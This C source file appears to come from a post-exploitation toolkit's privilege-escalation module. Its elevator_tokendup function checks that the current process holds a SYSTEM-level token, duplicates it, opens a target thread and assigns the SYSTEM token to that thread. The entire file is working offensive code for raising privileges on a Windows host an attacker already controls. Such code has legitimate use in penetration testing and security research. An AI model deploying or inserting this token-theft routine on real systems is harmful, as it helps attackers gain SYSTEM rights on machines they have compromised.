#include "elevator.h"
#include "tokendup.h"

/*
 * Elevate the given thread with our current token if we are running under the required user.
 */
BOOL elevator_tokendup( DWORD dwThreadId, DWORD dwSecurityRID )
{
	DWORD dwResult                       = ERROR_SUCCESS;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	BOOL bIsSystem                       = FALSE;
	CHECKTOKENMEMBERSHIP pCheckTokenMembership = NULL;
	OPENTHREAD pOpenThread               = NULL;
	HANDLE hToken                        = NULL;
	HANDLE hProcessToken                 = NULL;
	HANDLE hThread                       = NULL;
	HANDLE hPipe                         = NULL;
	TOKEN_USER * lpTokenUser             = NULL;
	SID * lpSystemSID                    = NULL;
	char cServicePipe[MAX_PATH]          = {0};
	DWORD dwLength                       = 0;

	do
	{
		// dynamically resolve advapi32!CheckTokenMembership and kernel32!OpenThread as they are not present on NT4
		pCheckTokenMembership = (CHECKTOKENMEMBERSHIP)GetProcAddress( LoadLibrary( "advapi32" ), "CheckTokenMembership" );
		pOpenThread = (OPENTHREAD)GetProcAddress( LoadLibrary( "kernel32" ), "OpenThread" );
		if( !pCheckTokenMembership || !pOpenThread )
			BREAK_WITH_ERROR( "[ELEVATOR-TOKENDUP] elevator_thread. pCheckTokenMembership/pOpenthread == 0", ERROR_INVALID_HANDLE );

		if( !dwThreadId )
			BREAK_WITH_ERROR( "[ELEVATOR-TOKENDUP] elevator_thread. dwThreadId == 0", ERROR_INVALID_HANDLE );

		if( !OpenProcessToken( GetCurrentProcess(), TOKEN_DUPLICATE|TOKEN_IMPERSONATE|TOKEN_QUERY, &hProcessToken ) )
			BREAK_ON_ERROR( "[ELEVATOR-TOKENDUP] elevator_thread. OpenToken failed" );

		if( !AllocateAndInitializeSid( &NtAuthority, 1, dwSecurityRID, 0, 0, 0, 0, 0, 0, 0, &lpSystemSID ) )
			BREAK_ON_ERROR( "[ELEVATOR-TOKENDUP] elevator_thread. AllocateAndInitializeSid failed" );

		if( !DuplicateTokenEx( hProcessToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hToken ) )
			BREAK_ON_ERROR( "[ELEVATOR-TOKENDUP] elevator_thread. DuplicateTokenEx failed" );

		if( !pCheckTokenMembership( hToken, lpSystemSID, &bIsSystem ) )
			BREAK_ON_ERROR( "[ELEVATOR-TOKENDUP] elevator_thread. CheckTokenMembership failed" );

		if( !bIsSystem )
			BREAK_WITH_ERROR( "[ELEVATOR-TOKENDUP] elevator_thread. bIsSystem == FALSE", ERROR_INVALID_SID );

		hThread = pOpenThread( THREAD_ALL_ACCESS, TRUE, dwThreadId );
		if( !hThread )
			BREAK_ON_ERROR( "[ELEVATOR-TOKENDUP] elevator_thread. OpenThread failed" );

		if( !SetThreadToken( &hThread, hToken ) )
			BREAK_ON_ERROR( "[ELEVATOR-TOKENDUP] elevator_thread. SetThreadToken failed" );

		dprintf( "[ELEVATOR-TOKENDUP] elevator_thread. Gave SYSTEM token to thread %d", dwThreadId );

	} while( 0 );

	CLOSE_HANDLE( hProcessToken );

	CLOSE_HANDLE( hToken );

	CLOSE_HANDLE( hThread );

	if( lpSystemSID )
		FreeSid( lpSystemSID ); 

	return dwResult;
}